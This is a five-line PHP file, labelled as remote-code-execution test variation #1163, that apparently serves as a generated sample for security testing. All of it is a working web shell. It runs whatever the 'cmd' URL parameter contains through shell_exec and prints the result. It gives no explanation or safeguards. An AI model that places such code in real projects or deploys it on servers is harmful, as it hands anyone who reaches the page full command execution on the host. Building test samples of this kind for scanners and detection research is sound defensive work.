<?php
// RCE test variation #1163
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>